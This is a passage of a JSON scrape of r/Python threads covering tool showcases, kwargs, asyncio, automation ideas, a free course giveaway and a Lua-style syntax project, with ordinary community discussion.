            "content": "Idk if i should be sharing it here or in r/learnpython... For those who are looking for resources : i followed few youtube tutorials but incase you just need code with minimal explanation you can follow THIS Article (not my article). It's too long for me to type and explain everything plus i m really tired (after coming from my workplace) Note: Since I used white cloth i had to manipulate only saturation values (range 0 to 30) The reason why there are 2 lower and upper ranges of hsv is bcz red occurs at 2 places in hsv chart (sorry it's difficult for me to explain like this, but you can find tons if resources on net) P. S. Sharing is caring. Thank you for the up votes"
        }
    ]
},
{
    "post_author": "PossiblePandaYT",
    "post_id": "1dcqw42",
    "post_score": "4",
    "post_time": "Monday, June 10, 2024 at 8:15:55 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "open source CLI tool for finding out how programs work",
    "media": [
        "https://github.com/PossiblePanda/hdiw",
        "https://camo.githubusercontent.com/6d8e7d1e775d017ddc6ce78601bf848a3cbec51302a6e431b39834e30a31c402/68747470733a2f2f692e696d6775722e636f6d2f374a6471356c382e706e67"
    ],
    "post_content": "What my project does\nAllow users to find out what frameworks, tools, engines a program / game was made in.\nLooks through a directory and searches for common folder structures, and file names.\nYou can add the -d flag to do a \"deep dive\" and it will look through for strings inside of the binaries.\nImage Example\nTarget Audience\nAnyone! Developers looking to learn how other programs were made, people who are just interested.\nComparison\nNot sure if there are any alternatives, but another way of finding out how a program runs is looking through the names of files & folders.\nGitHub: https://github.com/PossiblePanda/hdiw\nContributors are appreciated :), adding new frameworks, or improving the core of hdiw.",
    "comments": [
        {
            "author": "denehoffman",
            "score": "4",
            "content": "It’s cool! My constructive criticism is that it took me a hot second to figure out that the percentages were probabilities of being right, not percentage of the code structure (like GitHub does with percentages of languages). But otherwise, I like it :)",
            "replies": [
                {
                    "author": "PossiblePandaYT",
                    "score": "2",
                    "content": "ah, I probably should have some sort of indicator for that. Thanks! :)"
                },
                {
                    "author": "PossiblePandaYT",
                    "score": "2",
                    "content": "feel free to leave a star on github ;)"
                }
            ]
        }
    ]
},
{
    "post_author": "Benoss",
    "post_id": "1diqpcb",
    "post_score": "4",
    "post_time": "Tuesday, June 18, 2024 at 4:28:55 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Looking for a good WYZIWIG/visual editor to go with with Jinja + Weasyprint",
    "media": [
        "https://github.com/Kozea/WeasyPrint",
        "https://editorjs.io/",
        "https://github.com/slab/quill",
        "https://github.com/pallets/jinja",
        "https://github.com/GrapesJS/grapesjs"
    ],
    "post_content": "End goal is to produce PDF using external data and a template. Needs to support Jinja tags, conditionals and loops.\nUsing https://github.com/Kozea/WeasyPrint and https://github.com/pallets/jinja as base stack (Open to other suggestions)\nI was thinking of building some base HTML templates but would be awesome if I could find a visual HTML editor that could produce code 100% compatible with Weasyprint so that end users can build templates by themselves or modify existing ones.\nCould be Wysiwyg based using https://editorjs.io or https://github.com/slab/quill\nor more advanced web builders like https://github.com/GrapesJS/grapesjs\nAnybody built something similar?",
    "comments": [
        {
            "author": "PhENTZ",
            "score": "2",
            "content": "Wyziwig (??) or Wysiwyg (What You See Is What You Get) ?",
            "replies": [
                {
                    "author": "Benoss",
                    "score": "1",
                    "content": "yep or in my case it has to be \"What You See Is What I Get\" :)"
                }
            ]
        },
        {
            "author": "Amazing_Upstairs",
            "score": "2",
            "content": "I did something that might help. I used rst2pdf, so you make restructuredText (rst) and then convert it to a pdf. I think you get rst WYSIWYG js editors. See https://softwarerecs.stackexchange.com/questions/34239/wysiwyg-restructuredtext-editor",
            "replies": [
                {
                    "author": "Amazing_Upstairs",
                    "score": "1",
                    "content": "Markdown or Sphinx might also be other options. I would be interested to hear if you come right with anything, since I would also like to do something like this. If it works in Powerapps even better."
                }
            ]
        }
    ]
},
{
    "post_author": "rubickcz",
    "post_id": "63dkmq",
    "post_score": "3309",
    "post_time": "Tuesday, April 4, 2017 at 2:40:55 PM GMT+3",
    "flair_text": "",
    "post_title": "We started late, but we managed to leave Python footprint on r/place!",
    "media": [
        "https://preview.redd.it/t29ko63dwipy.png?auto=webp&s=cbd99172189893ecea31fa120f946eea79493627",
        "https://i.redd.it/t29ko63dwipy.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "jerry_fuentes",
            "score": "250",
            "content": "slowclap.py"
        },
        {
            "author": "iluvstephenhawking",
            "score": "189",
            "content": "",
            "replies": [
                {
                    "author": "CozMedic",
                    "score": "85",
                    "content": ""
                }
            ]
        },
        {
            "author": "robodude987",
            "score": "21",
            "content": "You destroyed the tsundere shark"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1dd0jsu",
    "post_score": "1",
    "post_time": "Tuesday, June 11, 2024 at 3:00:10 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Tuesday Daily Thread: Advanced questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Destruct1",
            "score": "2",
            "content": "I have a separate class that manages a network connection with asyncio. This class needs a background work/task. The main program will also use asyncio. How can I structure this? Option a) Pass a loop parameter to the class and always use self.loop.some_function for all asyncio needs. The main program would initialize the event loop with asyncio.new_event_loop() and also use the resulting loop variable. This works but feels very manual. I only need one event loop and have no special requirement. Passing loop parameters around seems redundant. Option b) Run a single async main function with asyncio.run(main()). Create all my classes only inside this function. The classes use standard asyncio.functions. This also works but is cumbersome; I cant test the NetworkClass separately from a main function. Option c) A better option that does not have the disadvantages of the other approaches."
        }
    ]
},
{
    "post_author": "LeastPrice8673",
    "post_id": "1dg4cof",
    "post_score": "53",
    "post_time": "Saturday, June 15, 2024 at 2:27:36 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Python automation ideas",
    "media": [],
    "post_content": "Hi I’m looking for inspiration for some stupid python automation projects. If you have done something funny or stupid using python automation I would love to hear it.",
    "comments": [
        {
            "author": "rasputin1",
            "score": "228",
            "content": "automate a bot to detect every time a similar question gets asked",
            "replies": [
                {
                    "author": "eXtc_be",
                    "score": "56",
                    "content": "and make it reply \"automate a bot to detect every time a similar question gets asked\""
                },
                {
                    "author": "ThreeChonkyCats",
                    "score": "14",
                    "content": "Do this on r/Linux r/Linuxquestions and r/Mint and it will eliminate 90% of the sub! It's so bad I barely look at it now."
                },
                {
                    "author": "No-Engineering-239",
                    "score": "2",
                    "content": "is this something you would use NLP for? as in some NLP libraries? and/or Regular Expressions? Im very interested in learning web scraping with Python and wondering if this is something that a beginner programmer would possibly be able to get into and Im under the impression that learning NLP skills would be really helpful but swems quite daunting..."
                },
                {
                    "author": "Lewistrick",
                    "score": "2",
                    "content": "Does the praw library still work after all the third party apps shut down?"
                }
            ]
        },
        {
            "author": "yrubooingmeimryte",
            "score": "30",
            "content": "This kind of question is probably more suitable for r/learnpython. Also, it’s a very vague question. You should probably give some kind of specific about the type of automation you would be interested in doing."
        },
        {
            "author": "mrkikkeli",
            "score": "28",
            "content": "Xkcd made a comic about a script that searches eBay for something random about 10 bucks plus shipping, and orders it for you. Prep it up with a virtual credit card (to make sure it won't empty your bank account) and run it blind every week to get a random present.",
            "replies": [
                {
                    "author": "ThreeChonkyCats",
                    "score": "7",
                    "content": "Or use AliExpress and order a bunch of the one-cent specials :)"
                }
            ]
        },
        {
            "author": "Tasty_Waifu",
            "score": "26",
            "content": "There is an entire book about this called \"Automate the boring stuff with python\" from No Starch Press. At least it helped me increase my productivity and grow into the language."
        },
        {
            "author": "Knockoutpie1",
            "score": "45",
            "content": "I have an idea. Track popular protein prices and find the one with the LeastPrice per serving. Make it update with the click of a button so I don’t have to manually search every few months. Gold standard Recon1 Muscle milk Orgain Nutricost Dymatize If you don’t build it then I will!",
            "replies": [
                {
                    "author": "Brag_",
                    "score": "8",
                    "content": "I've been wanting to do this ever since the prices skyrocketed during covid. Just have to find the time for it. Please build it"
                }
            ]
        },
        {
            "author": "Historical_Steak_927",
            "score": "7",
            "content": "Try selenium + chromedriver to scrap websites, LinkedIn is a favourite for it. Go to GitHub and you’ll find a few projects there, very fun"
        }
    ]
},
{
    "post_author": "TheRealFrostMana",
    "post_id": "1ddnokn",
    "post_score": "151",
    "post_time": "Tuesday, June 11, 2024 at 11:05:24 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Kwargs appreciation thread",
    "media": [],
    "post_content": "Edit: Thanks a lot to those who pointed it out: The name of the concept in question is actually keyword-only arguments. **kwargs is lovely as well, though!\nI learned Python as my first language and it's the one I'm most proficient in. However, I've since written JavaScript, TypeScript, C#, and a little bit of Go.\nEven though each language has its own way of doing things, I find that I often miss being able to use kwargs for the sake of readability. This is what I mean:\nsome_function(semantic_parameter_name=value1, explanatory_parameter_name=value2)\nOften times, the usage of kwargs is sufficiently explanatory of what the function does. Whether it's someone else's code or code that you've written a while back, not only does it save you having to peek at the function's signature/code, it also helps piece together what a block of code intends to do at first glance.\nAt this point, for codebases that I maintain, I almost exclusively define my functions to force the usage of kwargs:\nkwargs_are_mandatory(*, parameter1: int, parameter2: str) -> None:\n    return\nWhen I read code in a language that doesn't support some form of kwargs, I find it more difficult and time consuming to wrap my head around what's happening.\nWhat are your thoughts on kwargs?",
    "comments": [
        {
            "author": "redditusername58",
            "score": "119",
            "content": "I would call those keyword arguments or keyword-only arguments. To me **kwargs means variadic keyword arguments.",
            "replies": [
                {
                    "author": "TheRealFrostMana",
                    "score": "14",
                    "content": "Indeed this is what I meant. Thank you for the correction!"
                }
            ]
        },
        {
            "author": "rumnscurvy",
            "score": "30",
            "content": "In my opinion the best feature in the args/kwargs system is that you can use arg names as kwargs. For instance, if you write def f(x,y): (...), you can always call f(x='foo', y='blah') as if x and y were kwargs. Somehow the function \"remembers\" what its arguments were labelled as.",
            "replies": [
                {
                    "author": "justheretolurk332",
                    "score": "34",
                    "content": ""
                }
            ]
        },
        {
            "author": "not_sane",
            "score": "6",
            "content": "I worked with projects that had a lot of **kwargs and it sucked hard, you needed to step through 3 classes in an inheritance hierarchy only to find out the parameters a function will take. (The understandability of the code base in question also was not enhanced by making heavy use of metaclasses, urgh...) In my opinion truly good Python code should pass Pyright on strict mode, and that one also complains about **kwargs. For typing existing kwargs I also recommend the new Unpack feature: https://typing.readthedocs.io/en/latest/spec/callables.html#unpack-kwargs"
        },
        {
            "author": "CyberWiz42",
            "score": "16",
            "content": "They are beautiful and one of the reasons I’ll never seriously consider another language. The ability to easily pass parameters through several layers, using **kwargs without having to repeat them all the time gives me a warm feeling in my tummy. Unfortunately it doesnt mesh 100% with type hints (e.g. https://github.com/locustio/locust/pull/2699), but it is totally worth it. And I wouldn’t go as far as to stop using positional parameters. At least not for functions with 3 or fewer params. If I’m going to nit-pick: What you have in your examples are ”named parameters”. ”kwargs” is (in my vocabulary at least) specific to the **kwargs/argument unpacking feature.",
            "replies": [
                {
                    "author": "afreydoa",
                    "score": "24",
                    "content": "Hm, yes. **kwargs is probably are pretty good idea to not have too much coupling to technicly deep layers. But sometimes I really hate them. If I want to know if the name of some parameter in my plotting library is 'width' or 'line_width' or something else. It's neither in the docstring, its not in the source code of the function I am calling, its not even in the documentation of that library, because it belongs to another library. I haven't found any IDE hack to mitigate the problem. And copilot is not very well versed with the library just yet. It's just annoying as a user of a library. But I get that it vastly reduces coupling."
                },
                {
                    "author": "SuspiciousScript",
                    "score": "23",
                    "content": "The ability to easily pass parameters through several layers, using **kwargs without having to repeat them all the time gives me a warm feeling in my tummy. This is convenient when you're writing code, but really sucks for anybody trying to call your functions. The effort you save by not explicitly passing parameters is just shifted to the reader who has to go code-spelunking to figure out what arguments your function actually takes. IMO this is only acceptable for internal functions/implementation details and not public APIs."
                },
                {
                    "author": "yrubooingmeimryte",
                    "score": "9",
                    "content": "In most contexts this is a seriously frustrating anti-pattern and is extremely un-pythonic. Especially when this is user facing in any way. It's an important part of the language because things like decorators and/or creating python wrappers around other libraries depend on having some efficient way of propagating args/kwargs through layers of code. But outside of those situations, having args/kwargs cascade through multiple layers of functionality just obfuscates what's happening. And if you do need to know how your inputs are being used, you have to manually track every aspect of the code through those layers and often through other libraries."
                }
            ]
        },
        {
            "author": "passwordsniffer",
            "score": "13",
            "content": "It's an amazing part of the language and I am using it a lot. But only siths deal in absolutes. It's a case by case thing. In many cases it does increase readability. But in some cases it might not really introduce much and might even make readability suffer due to extra bloat. zlib.crc32(data=my_string) does not introduce any value to me. I would probably prefer to write my own lib/find other lib if some maintainer decides for me of my preferred calling pattern, especially in case of 1-2 arguments. I would probably reject a code review if someone of my engineers tries to do that."
        }
    ]
},
{
    "post_author": "Sponta7",
    "post_id": "gaqe3d",
    "post_score": "3540",
    "post_time": "Thursday, April 30, 2020 at 9:23:00 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Made an annoying Python script that sends a friend on Facebook Messenger the Shrek movie word by word",
    "media": [
        "https://preview.redd.it/04iw5fezewv41.png?width=640&crop=smart&auto=webp&s=c8d67691536e657605e2c08899a81de606771230",
        "https://i.redd.it/04iw5fezewv41.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "",
            "content": "It was actually one of my first interactions with Python. I had to use it for an AI class a month ago for the first time and really enjoyed the language. I'm also someone that prefers to dive into some random fun project when learning a new language. Pissing of my friends was just a benefit of that. Putting github link here because this is one of the top comments and people keep asking me https://github.com/HenryAlbu/FB-Messenger-Whatsapp-Discord-message-spammer [update] ADDED WHATSAPP SCRIPT TO THE REPO [update] ADDED DISCORD SCRIPT TO THE REPO",
            "replies": [
                {
                    "author": "Sponta7",
                    "score": "310",
                    "content": "It was actually one of my first interactions with Python. I had to use it for an AI class a month ago for the first time and really enjoyed the language. I'm also someone that prefers to dive into some random fun project when learning a new language. Pissing of my friends was just a benefit of that. Putting github link here because this is one of the top comments and people keep asking me https://github.com/HenryAlbu/FB-Messenger-Whatsapp-Discord-message-spammer [update] ADDED WHATSAPP SCRIPT TO THE REPO [update] ADDED DISCORD SCRIPT TO THE REPO",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "",
                            "content": "Just going to drop this here https://github.com/deeppomf/DeepCreamPy",
                            "replies": [
                                {
                                    "author": "[deleted]",
                                    "score": "18",
                                    "content": "Just going to drop this here https://github.com/deeppomf/DeepCreamPy"
                                },
                                {
                                    "author": "ManikSingh2560",
                                    "score": "6",
                                    "content": "I made one for YouTube videos 😂"
                                }
                            ]
                        },
                        {
                            "author": "tetroxid",
                            "score": "42",
                            "content": "Pissing of my friends was just a benefit of that. What did you do with the piss of the friend?",
                            "replies": [
                                {
                                    "author": "Sponta7",
                                    "score": "18",
                                    "content": "This is so good that I'm not even going to edit the original comment 😂 well played"
                                },
                                {
                                    "author": "oki196",
                                    "score": "6",
                                    "content": "me also curious"
                                }
                            ]
                        },
                        {
                            "author": "banana_nutella_crepe",
                            "score": "3",
                            "content": "wow. I had no clue this could be done. I use Python on a daily basis, and during this lockdown, I've been looking into how to use it outside of my field. This gives me a few ideas. Thanks for sharing!"
                        },
                        {
                            "author": "[deleted]",
                            "score": "1",
                            "content": "The link does not seem to be working :("
                        },
                        {
                            "author": "itsknob",
                            "score": "1",
                            "content": "Nice! My first python project was sending my friends ASCII art of the middle finger. I did it by send myself an email with a specific subject, the body was the phone number. It was really helpful for learning how to utilize APIs like the Gmail one and utilize different libraries. Glad to see I'm not the only one with this kind of idea."
                        }
                    ]
                }
            ]
        },
        {
            "author": "jonr",
            "score": "62",
            "content": "Add random value to sleep(). 10 to 3600 \"Oh, he has finally stopped.... GADDEMIT, u/Sponta7!\""
        },
        {
            "author": "[deleted]",
            "score": "35",
            "content": "It's absolutely horrible, I love it. Great job."
        }
    ]
},
{
    "post_author": "filipemarch",
    "post_id": "1dcky9z",
    "post_score": "0",
    "post_time": "Monday, June 10, 2024 at 4:01:38 PM GMT+3",
    "flair_text": "News",
    "post_title": "Kivy School - Crowdfunding Update",
    "media": [
        "https://www.kickstarter.com/projects/kivyschool/the-pain-free-python-on-android-essentials-course",
        "https://kivyschool.com/"
    ],
    "post_content": "We're excited to share that our Kivy School crowdfunding project on Kickstarter is over 50% funded, but we only have 2 days left to reach our goal!\nWe want to show our appreciation to everyone who has supported us. Even if we don't reach 100% funding, everyone who trusted us will still receive free access to all free resources at kivyschool.com and our course on Udemy.\nKivy School is an organization made by volunteers to teach others how to create Python apps using the Kivy framework and deploy them on all platforms: Android, iOS, Windows, macOS, Linux, Raspberry and on your toaster!\nSo if you are still interested on helping Kivy School or on having free access to our Udemy course, you can risk free pledge on the crowdfunding link above before it expires.\nKeep an eye at Kivy School, soon we will publishing about:\nHot Reload on Android\nSupabase integration\nSentry integration\nUsing SQLAlchemy / SQLModel / Pydantic with Kivy\nGPS, Bluetooth, Wi-Fi, Android Services & much more!\nIt is Python. It is open source. And it is free.\nJoin us at Kivy School, and let's code together!",
    "comments": []
},
{
    "post_author": "anyfactor",
    "post_id": "itzn13",
    "post_score": "3272",
    "post_time": "Wednesday, September 16, 2020 at 8:02:08 PM GMT+3",
    "flair_text": "",
    "post_title": "An update on Python 4",
    "media": [
        "https://preview.redd.it/ayxwpuasjjn51.png?auto=webp&s=243b01de56f965698e3f2cb4b64bf5d48ee5f17f",
        "https://i.redd.it/ayxwpuasjjn51.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "333",
            "content": "",
            "replies": [
                {
                    "author": "NoLongerUsableName",
                    "score": "270",
                    "content": "If this article is accurate, it was pretty smooth, unlike the transition from 2 to 3.",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "-20",
                            "content": "The one I linked to.",
                            "replies": [
                                {
                                    "author": "NoLongerUsableName",
                                    "score": "115",
                                    "content": "The one I linked to."
                                },
                                {
                                    "author": "FewerPunishment",
                                    "score": "13",
                                    "content": "this one"
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "roerd",
                    "score": "60",
                    "content": "Here's the list of the most important changes: Overview of Changes Since 1.6 There are many new modules (including brand new XML support through the xml package, and i18n support through the gettext module); a list of all new modules is included below. Lots of bugs have been fixed. The process for making major new changes to the language has changed since Python 1.6. Enhancements must now be documented by a Python Enhancement Proposal (PEP) before they can be accepted. There are several important syntax enhancements, described in more detail below: Augmented assignment, e.g. x += 1 List comprehensions, e.g. [x**2 for x in range(10)] Extended import statement, e.g. import Module as Name Extended print statement, e.g. print >> file, \"Hello\" Other important changes: Optional collection of cyclical garbage So quite a few important new features, but nothing that was breaking backwards compatibility."
                },
                {
                    "author": "[deleted]",
                    "score": "386",
                    "content": "Nothing compared to the transition from 0 to 1."
                }
            ]
        },
        {
            "author": "Hall_of_Famer",
            "score": "51",
            "content": "Guido said that a while ago that the version after 3.9 would be 4.0, but then it seems that they decided to make it 3.10 to be consistent with semver. Python 4.0 will most likely be very different from Python 3.x, with a lot of new features and changes in the internal VM. In this case though, its interesting to see how they plan to make the transition smooth instead of another Python 2 vs 3 chaos. Whatever will happen, lets hope that at the very least, Python will stick with the the Zen(PEP 20) that 'Simple is better than Complex' and 'There should be one, and preferably only one obvious way to do it'. These are the characteristics of Python that makes it easier for beginners/data scientists, and part of the reason why it beats Perl and Ruby in terms of popularity."
        }
    ]
},
{
    "post_author": "Ardit-Sulce",
    "post_id": "yyi6xv",
    "post_score": "3470",
    "post_time": "Friday, November 18, 2022 at 2:48:22 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "The Python Mega Course is now free on Udemy",
    "media": [
        "https://udemy.com/course/former-python-mega-course-build-10-real-world-applications/",
        "https://pythonhow.com/python-paid-course/the-python-mega-course/"
    ],
    "post_content": "As some of you know, The Python Mega Course: Build 10 Real World Applications is one of the top courses on Udemy. I remade the course this year and now the course uses Python 3.11.\nToday, I am now giving the previous version of the course to you for free. Please note that everything still works in the old version, and you are taking the same content taken by other 200k students in the past. It's just that we use Python versions before 3.10 in the videos.\nUdemy link to get the course for free:\nhttps://udemy.com/course/former-python-mega-course-build-10-real-world-applications/\nPassword to enroll: mega_course\nEnjoy!\nEdit: Wow, 2.5k upvotes! Thank you so much! If anyone wants the new Udemy (paid) version of the course as well, you can get a good discount here: https://pythonhow.com/python-paid-course/the-python-mega-course/",
    "comments": [
        {
            "author": "TacticalLeemur",
            "score": "318",
            "content": "Ardit!!! Dude, this was the first programming course I bought and went through. It taught me enough to automate away a bunch of busy work at my job. The stuff I wrote after going through that course saved me hours a week, and convinced my boss to approve tuition reimbursement for me to do an online post-bacc in Computer science. Thank you for making this course! I'm in a good place that started right there.",
            "replies": [
                {
                    "author": "Ardit-Sulce",
                    "score": "131",
                    "content": "I am so glad to hear that! It is comments like this that make me want to create online courses. Thanks a lot!"
                },
                {
                    "author": "tMeepo",
                    "score": "23",
                    "content": "what kind of stuff did u automate at your job using python? in general. Just wanna see if its applicable to mine as deciding whether to learn python or not.",
                    "replies": [
                        {
                            "author": "TacticalLeemur",
                            "score": "72",
                            "content": "In my case, I was on a marketing team, where we had to setup custom emails. We would have a huge list of events that would go live each day and have some that we would force to the top of emails, and some that we would let a ML process personalize. The process to define the static events required copying information from three different internal web pages, pasting it into a text editor, then pasting it all into a bunch of fields in a highly finicky web form. My first version just scraped all those pages and presented all the data I needed to paste in. It used beautiful soup to do the scraping Then I found out that all of those pages were populated by a single swagger api. So I rebuilt it getting everything directly from the API. That simplified a lot of the work, and made it easier to add a feature to recheck every few minutes and highlight changes, so if something changes last minute we could catch it. I wanted to autopopulate the form, but alas it was a quagmire of poor design and worse reliability, so never got that far. But the tool I built saved us hours a week, and completely prevented multiple types of errors that had previously occurred. Another thing I automated was director reports. There were director meetings twice a week where they would go over the best performing events. We would have to assemble PPT slides which includes the image for each of the top 10 events and lay metrics over the image, arrange them in proper order and populate a bunch of totals data. It was a nightmare of image and text manipulation to make it all look okay. So I automated it all: Go pull metrics from BigQuery Order events by performance and pull individual metrics by event Pull event images using the pillow library Create one huge image and place images in it in the correct spot Layer text onto the image in the correct spot with appropriate font and color. Export image. In that way, I could generate the summary page and the drill down pages for every event. What has taken 3 or 4 hours twice a week suddenly took about a minute.",
                            "replies": [
                                {
                                    "author": "[deleted]",
                                    "score": "6",
                                    "content": "Really awesome example of real world example thanks for sharing"
                                },
                                {
                                    "author": "Valuable_Past_9817",
                                    "score": "1",
                                    "content": "Teach me your ways! I currently studying information science and want to get into indexing and code 👩🏻‍💻 I currently work as a librarian but want to get into database design. My masters program seems to be pretty outdated but I need the silly degree. But means I have to learn most of it on my own"
                                }
                            ]
                        },
                        {
                            "author": "obeythefro",
                            "score": "20",
                            "content": "It's applicable, I promise. If there is even a single tedious task in your job, it can be automated with python. Mine started with some reports that I was manually creating by taking data from various spreadsheets/sources and putting them into a single report and emailing. Eventually it ended up as an automated reporting software that pulls the data directly from the databases, creates pdf reports and emails them out to various departments / stakeholders. It puts out thousands of reports per month and I don't do anything besides occasional maintenance and adding new reports.",
                            "replies": [
                                {
                                    "author": "Clipper_Coffee_Tea",
                                    "score": "2",
                                    "content": "I am looking to do the same, part of the reason I want to take this course. I am wondering when you combine that data can you add it to a presentation style document with graphs and charts."
                                }
                            ]
                        },
                        {
                            "author": "baked_tea",
                            "score": "7",
                            "content": "Do it, worst case scenario you learn a new skill. Although you will most likely find something to automate"
                        },
                        {
                            "author": "gajendrakn87",
                            "score": "3",
                            "content": "Just go for it"
                        },
                        {
                            "author": "adalast",
                            "score": "2",
                            "content": "My boss actually assigns me to tasks that he doesn't want to do because he knows I will get sick of them in very short order and wrote a script to automate it. Doing marketing stuff with a Google sheet that had expressions for making a curl command to use the bitly api. Assigned it to me. Within a week I had a software with a JSON input that had the relevant information that built the marketing UTM codes, pulled the bitly links for each posting, assembled the message, including hashtags tailored to each platform, shortcuts for commonly used groups of hashtags, and all of it was assembled and pushed to our CRM for tracking and posting management. It took an entire days work once a week for him just to do like 10 posting channels and turned it into less than a minute to process and allowed him to hire someone who lacked the skillsets to do what he had been doing and take it off his plate almost entirely. I have also automated a bunch of metrics reporting and am currently toying with python tools directly in Slack to allow bots to manage tedious tasks for the various teams in the company."
                        }
                    ]
                }
            ]
        },
        {
            "author": "A2251",
            "score": "94",
            "content": "mega_thanks!"
        },
        {
            "author": "Techrob25",
            "score": "30",
            "content": "This is awesome. Thank you. This is why I love the Python community. So many other professions want to slam the door behind them once they've made it to the top. The Python community goes so far out of its way to open doors for other people. It's a big party and everyone is invited. You rock."
        },
        {
            "author": "Ardit-Sulce",
            "score": "102",
            "content": "I didn't expect all the upvotes. Thanks a lot! If anyone is interested in the new course, Udemy might have it on sale right now: https://www.udemy.com/course/the-python-mega-course/",
            "replies": [
                {
                    "author": "AlmostCasper",
                    "score": "14",
                    "content": "Just purchased the new course. Only $15.99 right now! Thank you Ardit."
                }
            ]
        },
        {
            "author": "Affectionate-Pride19",
            "score": "13",
            "content": "I am a student of Ardit. This guy is super knowledgeable. I spent 12 dollars. Worth every penny. I highly recommend it."
        },
        {
            "author": "FolkusOnMe",
            "score": "22",
            "content": "danke ❤️"
        },
        {
            "author": "LUNAVESSEL",
            "score": "19",
            "content": "Thanks OP! Have just started summer school for Python last week, much appreciate <3"
        }
    ]
},
{
    "post_author": "guangrei",
    "post_id": "1dh6v9i",
    "post_score": "0",
    "post_time": "Sunday, June 16, 2024 at 3:48:27 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Lua-style code blocks for Python",
    "media": [
        "https://github.com/guangrei/lython"
    ],
    "post_content": "Python is a great programming language, but sometimes the indentation can be terrible for some people (especially people with visual impairments).\nSo i created Lython.\nWhat the project does:\nLython replacing the Python indentation to lua-style code blocks.\nthis is example lython code\ndef test(num)\n    for i in range(num) do\n        if i == 0 then\n            print(\"zero\")\n        elif i % 2 == 1 then\n            print(\"odd\")\n        else\n            print(\"even\")\n        end # if else\n    end # for\nend # def\n\ntest(10)\nfor more info, please visit lython repo.\nTarget audience:\nPeoples with visual impairments (especially) and Programmers who want to write python code with new experience (generally)\nRepo & Source code:\nguangrei/lython",
    "comments": [
        {
            "author": "tartare4562",
            "score": "45",
            "content": "I can't see (heh) why having to read a bunch of ends and pairing them with the correct opening statement would be easier to read than an optical alignment that you don't even need to read in order to follow."
        },
        {
            "author": "johndburger",
            "score": "12",
            "content": ""
        },
        {
            "author": "yrubooingmeimryte",
            "score": "6",
            "content": "I applaud the effort to provide accessibility tools for people who might have difficulty coding. There’s not nearly enough effort made to make these kinds of things more inclusive. That said, I would maybe reconsider whether this specific approach is wise. Creating a whole separate Python variant for this one thing will likely never get wide usage and will just make it so that people with accessibility issues are never really writing Python code that everyone else can run or contribute to. Perhaps a better approach could be something like a VSCode extension or CLI tool that adds/removes Python comments at these same locations/tabs. That way you still get the visual indicator for the end of a block of code but the code itself is still compliant python. You could even just make it a visual indicator in the IDE (not an actual comment) so when code gets committed or pulled, it doesn’t actually need to add new content that other developers won’t be familiar with and it would automatically add the indicator to code the person didn’t actually write. I would recommend looking at something like “rainbow indent” in the vscode third party extensions library. I often use that to make indentation easier to read and I think it strikes a good balance between modifying the visual appearance of the code without it being a permanent fixture in the saved file."
        },
        {
            "author": "lucas1853",
            "score": "5",
            "content": "The screen readers that the majority of blind people use have support for indented code. NVDA, the most popular free and opensource screen reader in the world, optionally represents indented levels with beeps (ascending as the indent increases) or speech queues (\"4 space for i in range(num) do\"). It is primarily written (by blind/vi people) in Python (with lower level winapi interfaces etc in C++) without comments to represent the ends of blocks, BTW. I believe people have made like addons or something for VoiceOver on Mac as well. Perhaps there is some difficulty for visually impaired people using magnifiers rather than screen readers of which I'm unaware, or something."
        },
        {
            "author": "Irish_beast",
            "score": "11",
            "content": "The forced indentation and lack of braces or begin/end is the single best feature of Python I'm also guilty of wanting to design a better language. Luckily I came down from my high before I published and made a fool of myself."
        },
        {
            "author": "Basic-Love8947",
            "score": "21",
            "content": "Congrats, you butchered the language. The whole point of python is to have less boilerplate code.",
            "replies": [
                {
                    "author": "orad",
                    "score": "4",
                    "content": "Lol thanks I hate it 😂"
                }
            ]
        },
        {
            "author": "Kind_Cow7817",
            "score": "6",
            "content": "Feels bad for the next experienced python dev who has to take over this codebase"
        },
        {
            "author": "cpadev",
            "score": "6",
            "content": "Yuck. I’ve used Luau a lot and the end statement is my least favorite part about Lua/Luau. I honestly have come to love Python’s brace-less syntax since I don’t have to worry about missing braces all the time. This is even worse than braces."
        },
        {
            "author": "Hey_Look_80085",
            "score": "2",
            "content": "I find it hard to go back to Lua with all it's orphan end statements. Dirty stuff."
        }
    ]
},
{
    "post_author": "Cool-Focus6556",
    "post_id": "1dbxkd6",
    "post_score": "35",
    "post_time": "Sunday, June 9, 2024 at 7:20:24 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Async Python Clarifications",
    "media": [],
    "post_content": "Ok, so just so I have this straight:\nAsyncio runs in a single thread and uses cooperative multitasking to context switch between tasks\nThe threading library creates threads and uses preemptive multitasking to context switch between threads\nAsyncio is more efficient than threading for the reasons above\nBoth share the same CPU core/resources\nMultiprocessing is using additional cores to speed up CPU bound tasks\nSo to summarize: a process can create threads and threads can create tasks\nIs it just me or do people confuse processes as threads or also confuses tasks as threads? This makes getting it all straight pretty confusing and so any help here to confirm what I’ve learned above would be appreciated 🙏",
    "comments": [
        {
            "author": "Barafu",
            "score": "26",
